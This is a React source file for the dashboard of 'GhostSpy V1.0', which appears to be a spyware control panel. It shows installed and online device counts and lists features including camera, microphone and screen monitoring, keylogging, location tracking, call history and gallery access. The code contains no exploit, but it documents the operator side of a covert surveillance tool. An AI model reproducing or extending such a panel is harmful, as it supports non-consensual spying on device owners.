import { useContext, useEffect, useState } from "react";
import { useTranslation } from "react-i18next";

import { Container, Box, Avatar, Typography } from "@mui/material";
import { OverviewBudget } from "src/sections/overview/overview-budget";
import { OverviewTasksProgress } from "src/sections/overview/overview-tasks-progress";
import { OverviewTotalCustomers } from "src/sections/overview/overview-total-customers";
import { OverviewTotalProfit } from "src/sections/overview/overview-total-profit";
import { AuthContext } from "src/contexts/auth-context";

import Color from "src/theme/colors";

const now = new Date();

export const DashboardContent = () => {
  const { t } = useTranslation();
  const { user, devices } = useContext(AuthContext);

  const [installedDevices, setInstalledDevices] = useState(0);
  const [onlineDevices, setOnlineDevices] = useState(0);

  useEffect(() => {
    if (user != null) {
      const installedDevices = user.devices;
      setInstalledDevices(installedDevices);
    }
    if (devices) {
      const onlineDevicesCount = devices.filter((device) => device.online === true).length;
      setOnlineDevices(onlineDevicesCount);
    }
  }, [user, devices]);

  return (
    <div
      style={{
        flexGrow: 1,
        padding: "48px 0",
      }}
    >
      <Container maxWidth="xxl">
        <Box
          sx={{
            display: "flex",
            flexWrap: "wrap",
            flexDirection: { md: "row", xs: "column" },
            gap: "16px",
          }}
        >
          <div
            style={{
              flex: "1 calc(50% - 16px)",
              minWidth: "200px",
            }}
          >
            <div
              style={{
                backgroundColor: Color.background.main_gray01,
                border: `solid 1px ${Color.background.border}`,
                borderRadius: "5px",
                padding: "16px",
              }}
            >
              <div style={{ display: "flex", alignItems: "flex-end", gap: "15px" }}>
                <Avatar
                  sx={{
                    cursor: "pointer",
                    height: 60,
                    width: 60,
                  }}
                  src={user?.avatar_url ? user?.avatar_url : "/assets/logos/user_149071.png"}
                />

                <div>
                  <Typography sx={{ color: Color.text.primary, fontSize: "14px" }}>
                    {t("dashboard.welcome")}
                  </Typography>
                  <Typography sx={{ color: Color.text.purple, fontSize: "20px", fontWeight: 600 }}>
                    {user?.username}
                  </Typography>
                </div>
              </div>

              <div style={{ display: "flex", marginTop: "20px" }}>
                <div style={{ padding: "0px 20px" }}>
                  <Typography sx={{ color: Color.text.primary, fontSize: "30px", fontWeight: 600 }}>
                    {user?.status ? "Online" : "Offline"}
                  </Typography>
                  <Typography sx={{ color: Color.text.secondary, fontSize: "14px" }}>
                    {t("dashboard.systemStatus")}
                  </Typography>
                </div>
                <div
                  style={{
                    borderLeft: `solid 1px ${Color.background.border}`,
                    padding: "0px 20px",
                  }}
                >
                  <Typography sx={{ color: Color.text.primary, fontSize: "30px", fontWeight: 600 }}>
                    {user?.devices}
                  </Typography>
                  <Typography sx={{ color: Color.text.secondary, fontSize: "14px" }}>
                    {t("dashboard.installedDevices")}
                  </Typography>
                </div>
              </div>
            </div>

            <div
              style={{
                backgroundColor: Color.background.main_gray01,
                border: `solid 1px ${Color.background.border}`,
                borderRadius: "5px",
                padding: "16px",
                marginTop: "16px",
              }}
            >
              {" "}
              <div
                style={{
                  borderBottom: `solid 2px ${Color.background.border}`,
                  display: "flex",
                  justifyContent: "space-between",
                }}
              >
                <Typography
                  sx={{
                    color: Color.text.primary,
                    fontSize: "24px",
                    fontFamily: "Bebas Neue, sans-serif",
                    pb: 1,
                  }}
                >
                  {"GhostSpy"}
                </Typography>
                <Typography
                  sx={{
                    fontSize: "20px",
                    color: Color.text.purple,
                    fontFamily: "Bebas Neue, sans-serif",
                  }}
                >
                  {"V1.0"}
                </Typography>
              </div>
              <div
                style={{ marginTop: "20px", display: "flex", flexDirection: "column", gap: "10px" }}
              >
                <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
                  <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
                    {t("dashboard.introduce.greeting")}
                  </Typography>
                  <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
                    {t("dashboard.introduce.introduce")}
                  </Typography>
                </div>

                <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
                  <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
                    {t("dashboard.introduce.feature.title")}
                  </Typography>

                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      gap: "1px",
                      paddingLeft: "10px",
                    }}
                  >
                    <Typography
                      sx={{ color: Color.text.primary, fontSize: "16px" }}
                      dangerouslySetInnerHTML={{
                        __html: t("dashboard.introduce.feature.screen-monitor"),
                      }}
                    ></Typography>
                    <Typography
                      sx={{ color: Color.text.primary, fontSize: "16px" }}
                      dangerouslySetInnerHTML={{
                        __html: t("dashboard.introduce.feature.screen-skeleton"),
                      }}
                    ></Typography>
                    <Typography
                      sx={{ color: Color.text.primary, fontSize: "16px" }}
                      dangerouslySetInnerHTML={{
                        __html: t("dashboard.introduce.feature.camera-monitor"),
                      }}
                    ></Typography>
                    <Typography
                      sx={{ color: Color.text.primary, fontSize: "16px" }}
                      dangerouslySetInnerHTML={{
                        __html: t("dashboard.introduce.feature.mic-monitor"),
                      }}
                    ></Typography>
                    <Typography
                      sx={{ color: Color.text.primary, fontSize: "16px" }}
                      dangerouslySetInnerHTML={{
                        __html: t("dashboard.introduce.feature.key-log"),
                      }}
                    ></Typography>
                    <Typography
                      sx={{ color: Color.text.primary, fontSize: "16px" }}
                      dangerouslySetInnerHTML={{
                        __html: t("dashboard.introduce.feature.gallery-manager"),
                      }}
                    ></Typography>
                    <Typography
                      sx={{ color: Color.text.primary, fontSize: "16px" }}
                      dangerouslySetInnerHTML={{
                        __html: t("dashboard.introduce.feature.real-location"),
                      }}
                    ></Typography>
                    <Typography
                      sx={{ color: Color.text.primary, fontSize: "16px" }}
                      dangerouslySetInnerHTML={{
                        __html: t("dashboard.introduce.feature.call-history"),
                      }}
                    ></Typography>
                    <Typography
                      sx={{ color: Color.text.primary, fontSize: "16px" }}
                      dangerouslySetInnerHTML={{
                        __html: t("dashboard.introduce.feature.privacy-mode"),
                      }}
                    ></Typography>
                  </div>

                  <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
                    {t("dashboard.introduce.feedback")}
                  </Typography>
                  <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
                    {t("dashboard.introduce.thanks")}
                  </Typography>
                  <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
                    {t("dashboard.introduce.under")}
                  </Typography>
                  <Typography sx={{ color: Color.text.primary, fontSize: "16px" }}>
                    {t("dashboard.introduce.supporter")}
                  </Typography>
                </div>
              </div>
            </div>
          </div>
          <div style={{ flex: "1 calc(50% - 16px)", minWidth: "200px" }}>
            <div style={{ display: "flex", flexWrap: "wrap", gap: "16px" }}>
              <div
                style={{
                  flex: "1 calc(50% - 16px)",
                  minWidth: "200px",
                }}
              >
                <OverviewBudget
                  difference={12}
                  positive
                  sx={{
                    height: "100%",
                    backgroundColor: Color.background.main_gray01,
                    border: `solid 1px ${Color.background.border}`,
                    borderRadius: "5px",
                    padding: "16px",
                  }}
                  value={installedDevices}
                />
              </div>
              <div
                style={{
                  flex: "1 calc(50% - 16px)",
                  minWidth: "200px",
                }}
              >
                <OverviewTotalCustomers
                  difference={16}
                  positive={false}
                  sx={{
                    height: "100%",
                    backgroundColor: Color.background.main_gray01,
                    border: `solid 1px ${Color.background.border}`,
                    borderRadius: "5px",
                    padding: "16px",
                  }}
                  value={onlineDevices.toString()}
                />
              </div>
              <div
                style={{
                  flex: "1 calc(50% - 16px)",
                  minWidth: "200px",
                }}
              >
                <OverviewTasksProgress
                  sx={{
                    height: "100%",
                    backgroundColor: Color.background.main_gray01,
                    border: `solid 1px ${Color.background.border}`,
                    borderRadius: "5px",
                    padding: "16px",
                  }}
                  value={installedDevices}
                />
              </div>
              <div
                style={{
                  flex: "1 calc(50% - 16px)",
                  minWidth: "200px",
                }}
              >
                <OverviewTotalProfit
                  sx={{
                    height: "100%",
                    backgroundColor: Color.background.main_gray01,
                    border: `solid 1px ${Color.background.border}`,
                    borderRadius: "5px",
                    padding: "16px",
                  }}
                  value="Online"
                />
              </div>
            </div>
          </div>
        </Box>
      </Container>
    </div>
  );
};
